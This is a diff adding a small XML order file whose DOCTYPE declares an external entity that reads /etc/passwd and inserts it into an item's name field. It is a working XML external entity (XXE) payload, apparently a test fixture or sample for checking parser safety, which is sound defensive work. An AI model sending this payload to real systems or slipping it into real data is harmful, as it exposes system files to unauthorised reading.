@@ -1,0 +1,7 @@
+<!DOCTYPE root[<!ENTITY c SYSTEM "/etc/passwd">]>
+<order>
+	<item>
+		<name>&c;</name>
+		<amount>14</amount>
+	</item>
+</order>
